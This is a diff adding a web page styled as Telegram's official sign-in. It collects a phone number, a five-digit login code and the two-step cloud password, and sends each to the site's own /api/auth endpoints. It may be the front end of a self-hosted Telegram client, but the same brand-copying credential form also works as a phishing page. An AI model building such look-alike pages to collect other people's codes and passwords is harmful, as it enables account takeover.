@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="ar" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Telegram — Sign In</title>
+<link rel="icon" href="/static/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --tg-blue:#2AABEE;
+  --tg-blue-dark:#179CDE;
+  --tg-blue-light:#62BFFF;
+  --tg-green:#00C73E;
+  --tg-red:#FF3B30;
+  --tg-bg:#F1F1F1;
+  --tg-surface:#FFFFFF;
+  --tg-text:#000000;
+  --tg-hint:#999999;
+  --tg-divider:#E0E0E0;
+  --tg-shadow:0 1px 2px rgba(0,0,0,0.1),0 4px 16px rgba(0,0,0,0.08);
+}
+html,body{height:100%;font-family:'Roboto',sans-serif;background:var(--tg-bg);color:var(--tg-text)}
+
+/* ── layout ── */
+.page{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.card{
+  background:var(--tg-surface);
+  border-radius:14px;
+  box-shadow:var(--tg-shadow);
+  width:100%;max-width:400px;
+  overflow:hidden;
+  position:relative;
+}
+
+/* ── steps container ── */
+.steps-wrap{position:relative;overflow:hidden}
+.step{
+  padding:40px 40px 36px;
+  transition:transform .35s cubic-bezier(.4,0,.2,1),opacity .35s;
+  position:absolute;width:100%;top:0;left:0;
+  opacity:0;pointer-events:none;transform:translateX(60px);
+}
+.step.active{position:relative;opacity:1;pointer-events:all;transform:none}
+.step.exit{opacity:0;transform:translateX(-60px)}
+
+/* ── logo ── */
+.logo-wrap{text-align:center;margin-bottom:24px}
+.logo-wrap svg{width:90px;height:90px;display:block;margin:0 auto 16px}
+.logo-wrap h1{font-size:22px;font-weight:500;color:var(--tg-text);margin-bottom:8px}
+.logo-wrap p{font-size:14px;color:var(--tg-hint);line-height:1.5}
+
+/* ── phone input ── */
+.phone-row{display:flex;gap:8px;margin-bottom:8px}
+.country-code{
+  display:flex;align-items:center;gap:6px;
+  border:1.5px solid var(--tg-divider);border-radius:8px;
+  padding:10px 12px;cursor:pointer;white-space:nowrap;
+  font-size:15px;color:var(--tg-text);transition:border-color .2s;
+  background:none;
+}
+.country-code:focus,.country-code:hover{border-color:var(--tg-blue);outline:none}
+.country-code .flag{font-size:20px}
+
+.tg-input{
+  width:100%;border:1.5px solid var(--tg-divider);border-radius:8px;
+  padding:10px 14px;font-size:15px;font-family:inherit;
+  color:var(--tg-text);background:none;transition:border-color .2s;
+  outline:none;
+}
+.tg-input:focus{border-color:var(--tg-blue)}
+.tg-input::placeholder{color:var(--tg-hint)}
+.tg-input.has-error{border-color:var(--tg-red)}
+
+.input-label{font-size:13px;color:var(--tg-hint);margin-bottom:6px;display:block}
+.input-hint{font-size:12px;color:var(--tg-hint);margin-top:4px}
+.input-error{font-size:12px;color:var(--tg-red);margin-top:4px;display:none}
+.input-error.show{display:block}
+
+/* ── OTP boxes ── */
+.otp-wrap{display:flex;gap:8px;justify-content:center;margin:8px 0}
+.otp-digit{
+  width:48px;height:56px;text-align:center;font-size:22px;font-weight:500;
+  border:1.5px solid var(--tg-divider);border-radius:8px;
+  font-family:inherit;color:var(--tg-text);background:none;
+  transition:border-color .2s;outline:none;caret-color:var(--tg-blue);
+}
+.otp-digit:focus{border-color:var(--tg-blue)}
+.otp-digit.filled{border-color:var(--tg-blue);color:var(--tg-blue)}
+
+/* ── button ── */
+.btn-tg{
+  display:block;width:100%;margin-top:20px;
+  background:var(--tg-blue);color:#fff;
+  border:none;border-radius:8px;padding:13px;
+  font-size:15px;font-weight:500;font-family:inherit;
+  cursor:pointer;transition:background .2s,transform .1s;
+  text-align:center;letter-spacing:.2px;
+}
+.btn-tg:hover{background:var(--tg-blue-dark)}
+.btn-tg:active{transform:scale(.98)}
+.btn-tg:disabled{background:#C4C4C4;cursor:not-allowed}
+.btn-tg.loading{pointer-events:none;opacity:.75}
+
+.btn-text{
+  display:block;width:100%;margin-top:10px;
+  background:none;border:none;color:var(--tg-blue);
+  font-size:14px;font-family:inherit;cursor:pointer;padding:8px;
+  border-radius:8px;transition:background .2s;
+}
+.btn-text:hover{background:rgba(42,171,238,.07)}
+
+/* ── spinner ── */
+.spinner{
+  display:inline-block;width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.4);border-top-color:#fff;
+  border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-left:6px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── countdown ── */
+.countdown{text-align:center;margin-top:12px;font-size:13px;color:var(--tg-hint)}
+.countdown span{color:var(--tg-blue);font-weight:500}
+
+/* ── decorative top bar ── */
+.card-top{height:4px;background:linear-gradient(90deg,#2AABEE,#34C5F3)}
+
+/* ── user avatar in step 2/3 ── */
+.user-badge{
+  display:flex;align-items:center;gap:12px;
+  background:#F5F5F5;border-radius:10px;padding:12px 14px;
+  margin-bottom:20px;
+}
+.user-badge .avatar{
+  width:40px;height:40px;border-radius:50%;
+  background:var(--tg-blue);color:#fff;
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;font-weight:700;flex-shrink:0;
+}
+.user-badge .info .name{font-size:14px;font-weight:500}
+.user-badge .info .phone{font-size:13px;color:var(--tg-hint)}
+
+/* ── security icon for 2FA ── */
+.lock-icon{text-align:center;font-size:52px;margin-bottom:16px}
+
+/* toast */
+.toast{
+  position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);
+  background:#323232;color:#fff;padding:10px 20px;border-radius:8px;
+  font-size:14px;opacity:0;transition:all .3s;z-index:9999;white-space:nowrap;
+  pointer-events:none;
+}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+<div class="page">
+<div class="card">
+  <div class="card-top"></div>
+  <div class="steps-wrap" id="stepsWrap">
+
+    <!-- Step 1: Phone -->
+    <div class="step active" id="step1">
+      <div class="logo-wrap">
+        <svg viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="120" cy="120" r="120" fill="url(#tgGrad)"/>
+          <path d="M180 72L156 168c-1.7 7.2-6.2 9-12.6 5.6l-35-25.8-16.9 16.3c-1.9 1.9-3.5 3.5-7.2 3.5l2.6-36.5 66.5-60.1c2.9-2.6-.6-4-4.5-1.4l-82.2 51.8-35.4-11.1c-7.7-2.4-7.8-7.7 1.6-11.4l138-53.2c6.4-2.3 12 1.6 9.6 11.3z" fill="#fff"/>
+          <defs>
+            <linearGradient id="tgGrad" x1="120" y1="0" x2="120" y2="240" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#2AABEE"/><stop offset="1" stop-color="#229ED9"/>
+            </linearGradient>
+          </defs>
+        </svg>
+        <h1>Telegram</h1>
+        <p>Please confirm your country code and enter your phone number.</p>
+      </div>
+
+      <label class="input-label">Country Code</label>
+      <div class="phone-row">
+        <button class="country-code" id="countryBtn" onclick="cycleCountry()">
+          <span class="flag" id="countryFlag">🇸🇦</span>
+          <span id="countryDial">+966</span>
+        </button>
+        <input class="tg-input" type="tel" id="phoneInput" placeholder="Phone number" maxlength="15" autocomplete="tel" dir="ltr">
+      </div>
+      <div class="input-error" id="phoneError">Invalid phone number</div>
+
+      <button class="btn-tg" id="sendCodeBtn" onclick="sendCode()">NEXT</button>
+    </div>
+
+    <!-- Step 2: Code -->
+    <div class="step" id="step2">
+      <div class="logo-wrap">
+        <div style="font-size:60px;margin-bottom:16px;">📱</div>
+        <h1>Enter Code</h1>
+        <p id="codeHint">We sent a code to <strong id="codePhone"></strong></p>
+      </div>
+
+      <div class="user-badge">
+        <div class="avatar" id="codeAvatar">?</div>
+        <div class="info">
+          <div class="name" id="codeUserName">Loading…</div>
+          <div class="phone" id="codeUserPhone"></div>
+        </div>
+      </div>
+
+      <label class="input-label">Verification Code</label>
+      <div class="otp-wrap" id="otpWrap"></div>
+      <div class="input-error" id="codeError">Incorrect code. Please try again.</div>
+
+      <div class="countdown" id="countdownWrap">
+        Resend code in <span id="countdownNum">60</span>s
+      </div>
+      <button class="btn-text" id="resendBtn" style="display:none" onclick="resendCode()">Resend Code</button>
+
+      <button class="btn-tg" id="verifyBtn" onclick="verifyCode()" disabled>NEXT</button>
+      <button class="btn-text" onclick="goBack(1)">← Use a Different Number</button>
+    </div>
+
+    <!-- Step 3: 2FA Password -->
+    <div class="step" id="step3">
+      <div class="logo-wrap">
+        <div class="lock-icon">🔐</div>
+        <h1>Two-Step Verification</h1>
+        <p>Please enter your cloud password.</p>
+      </div>
+
+      <label class="input-label">Password</label>
+      <input class="tg-input" type="password" id="passwordInput" placeholder="Password" autocomplete="current-password">
+      <div class="input-error" id="passError">Wrong password. Please try again.</div>
+
+      <button class="btn-tg" id="passwordBtn" onclick="verifyPassword()">SUBMIT</button>
+      <button class="btn-text" onclick="goBack(2)">← Back</button>
+    </div>
+
+  </div>
+</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ── State ──
+let currentStep = 1, currentPhone = '', countdownTimer = null;
+const COUNTRIES = [
+  {flag:'🇸🇦',code:'+966',name:'Saudi Arabia'},
+  {flag:'🇦🇪',code:'+971',name:'UAE'},
+  {flag:'🇪🇬',code:'+20', name:'Egypt'},
+  {flag:'🇮🇶',code:'+964',name:'Iraq'},
+  {flag:'🇸🇾',code:'+963',name:'Syria'},
+  {flag:'🇯🇴',code:'+962',name:'Jordan'},
+  {flag:'🇰🇼',code:'+965',name:'Kuwait'},
+  {flag:'🇶🇦',code:'+974',name:'Qatar'},
+  {flag:'🇧🇭',code:'+973',name:'Bahrain'},
+  {flag:'🇴🇲',code:'+968',name:'Oman'},
+  {flag:'🇾🇪',code:'+967',name:'Yemen'},
+  {flag:'🇱🇧',code:'+961',name:'Lebanon'},
+  {flag:'🇲🇦',code:'+212',name:'Morocco'},
+  {flag:'🇹🇷',code:'+90', name:'Turkey'},
+  {flag:'🇷🇺',code:'+7',  name:'Russia'},
+  {flag:'🇺🇸',code:'+1',  name:'USA'},
+  {flag:'🇬🇧',code:'+44', name:'UK'},
+  {flag:'🇩🇪',code:'+49', name:'Germany'},
+];
+let countryIdx = 0;
+
+function cycleCountry(){
+  countryIdx = (countryIdx + 1) % COUNTRIES.length;
+  const c = COUNTRIES[countryIdx];
+  document.getElementById('countryFlag').textContent = c.flag;
+  document.getElementById('countryDial').textContent = c.code;
+}
+
+// OTP digits
+function buildOtp(){
+  const wrap = document.getElementById('otpWrap');
+  wrap.innerHTML = '';
+  for(let i=0;i<5;i++){
+    const inp = document.createElement('input');
+    inp.className = 'otp-digit'; inp.type='tel'; inp.maxLength=1;
+    inp.dataset.idx = i;
+    inp.addEventListener('input', onOtpInput);
+    inp.addEventListener('keydown', onOtpKey);
+    inp.addEventListener('paste', onOtpPaste);
+    wrap.appendChild(inp);
+  }
+}
+buildOtp();
+
+function onOtpInput(e){
+  const inp=e.target,v=inp.value.replace(/\D/g,'');
+  inp.value=v;
+  inp.classList.toggle('filled',v!=='');
+  if(v) nextOtp(inp);
+  checkOtpComplete();
+}
+function onOtpKey(e){
+  if(e.key==='Backspace'&&!e.target.value) prevOtp(e.target);
+  if(e.key==='ArrowLeft') prevOtp(e.target);
+  if(e.key==='ArrowRight') nextOtp(e.target);
+}
+function onOtpPaste(e){
+  e.preventDefault();
+  const digits=(e.clipboardData.getData('text').replace(/\D/g,'')).slice(0,5);
+  const boxes=[...document.querySelectorAll('.otp-digit')];
+  digits.split('').forEach((d,i)=>{if(boxes[i]){boxes[i].value=d;boxes[i].classList.add('filled');}});
+  checkOtpComplete();
+  boxes[Math.min(digits.length,4)].focus();
+}
+function nextOtp(inp){
+  const next=inp.parentElement.querySelector(`[data-idx="${+inp.dataset.idx+1}"]`);
+  if(next) next.focus();
+}
+function prevOtp(inp){
+  const prev=inp.parentElement.querySelector(`[data-idx="${+inp.dataset.idx-1}"]`);
+  if(prev) prev.focus();
+}
+function getOtpValue(){
+  return [...document.querySelectorAll('.otp-digit')].map(i=>i.value).join('');
+}
+function checkOtpComplete(){
+  const done=getOtpValue().length===5;
+  document.getElementById('verifyBtn').disabled=!done;
+  if(done) verifyCode();
+}
+
+// ── Steps ──
+function showStep(n){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active','exit'));
+  const next=document.getElementById('step'+n);
+  const curr=document.getElementById('step'+currentStep);
+  if(curr&&curr!==next) curr.classList.add('exit');
+  setTimeout(()=>{
+    document.querySelectorAll('.step').forEach(s=>s.classList.remove('exit'));
+    next.classList.add('active');
+    currentStep=n;
+  },50);
+}
+
+function goBack(n){showStep(n)}
+
+// ── API calls ──
+async function sendCode(){
+  const dial = document.getElementById('countryDial').textContent;
+  const num  = document.getElementById('phoneInput').value.trim();
+  if(!num){showErr('phoneError','Please enter a phone number');return}
+  const phone = dial+num;
+  currentPhone = phone;
+
+  const btn=document.getElementById('sendCodeBtn');
+  btn.innerHTML='NEXT <span class="spinner"></span>';btn.disabled=true;
+
+  try{
+    const r=await fetch('/api/auth/send-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone})});
+    const d=await r.json();
+    if(d.success){
+      document.getElementById('codePhone').textContent=phone;
+      document.getElementById('codeAvatar').textContent=(num[0]||'?').toUpperCase();
+      document.getElementById('codeUserName').textContent='Telegram User';
+      document.getElementById('codeUserPhone').textContent=phone;
+      showStep(2);
+      startCountdown();
+      document.querySelector('.otp-digit').focus();
+    }else{showErr('phoneError',d.message||'Failed to send code')}
+  }catch(e){showErr('phoneError','Network error. Please try again.')}
+  btn.innerHTML='NEXT';btn.disabled=false;
+}
+
+async function verifyCode(){
+  const code=getOtpValue();
+  if(code.length<5) return;
+
+  const btn=document.getElementById('verifyBtn');
+  btn.innerHTML='NEXT <span class="spinner"></span>';btn.disabled=true;
+
+  try{
+    const r=await fetch('/api/auth/check-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:currentPhone,code})});
+    const d=await r.json();
+    if(d.success){
+      if(d.needs_password) showStep(3);
+      else window.location.href='/';
+    }else{
+      showErr('codeError',d.message||'Incorrect code');
+      document.querySelectorAll('.otp-digit').forEach(i=>{i.value='';i.classList.remove('filled');i.classList.add('has-error')});
+      setTimeout(()=>document.querySelectorAll('.otp-digit').forEach(i=>i.classList.remove('has-error')),1500);
+      document.querySelector('.otp-digit').focus();
+    }
+  }catch(e){showErr('codeError','Network error.')}
+  btn.innerHTML='NEXT';btn.disabled=false;
+}
+
+async function verifyPassword(){
+  const pw=document.getElementById('passwordInput').value;
+  if(!pw) return;
+
+  const btn=document.getElementById('passwordBtn');
+  btn.innerHTML='SUBMIT <span class="spinner"></span>';btn.disabled=true;
+
+  try{
+    const r=await fetch('/api/auth/check-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:currentPhone,password:pw})});
+    const d=await r.json();
+    if(d.success) window.location.href='/';
+    else{showErr('passError',d.message||'Wrong password');document.getElementById('passwordInput').classList.add('has-error');setTimeout(()=>document.getElementById('passwordInput').classList.remove('has-error'),1500);}
+  }catch(e){showErr('passError','Network error.')}
+  btn.innerHTML='SUBMIT';btn.disabled=false;
+}
+
+async function resendCode(){
+  try{
+    await fetch('/api/auth/send-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:currentPhone})});
+    showToast('Code sent!');
+    document.getElementById('resendBtn').style.display='none';
+    document.getElementById('countdownWrap').style.display='block';
+    startCountdown();
+  }catch(e){showToast('Failed to resend.')}
+}
+
+// ── Countdown ──
+function startCountdown(){
+  let sec=60;
+  const el=document.getElementById('countdownNum');
+  const wrap=document.getElementById('countdownWrap');
+  const btn=document.getElementById('resendBtn');
+  wrap.style.display='block';btn.style.display='none';
+  if(countdownTimer) clearInterval(countdownTimer);
+  countdownTimer=setInterval(()=>{
+    sec--;el.textContent=sec;
+    if(sec<=0){clearInterval(countdownTimer);wrap.style.display='none';btn.style.display='block';}
+  },1000);
+}
+
+// ── Helpers ──
+function showErr(id,msg){
+  const el=document.getElementById(id);
+  el.textContent=msg;el.classList.add('show');
+  setTimeout(()=>el.classList.remove('show'),3000);
+}
+function showToast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2500);
+}
+
+// Enter key
+document.getElementById('phoneInput').addEventListener('keydown',e=>{if(e.key==='Enter')sendCode()});
+document.getElementById('passwordInput').addEventListener('keydown',e=>{if(e.key==='Enter')verifyPassword()});
+
+// check if already logged in
+fetch('/api/auth/status').then(r=>r.json()).then(d=>{if(d.authenticated)window.location.href='/'});
+</script>
+</body>
+</html>
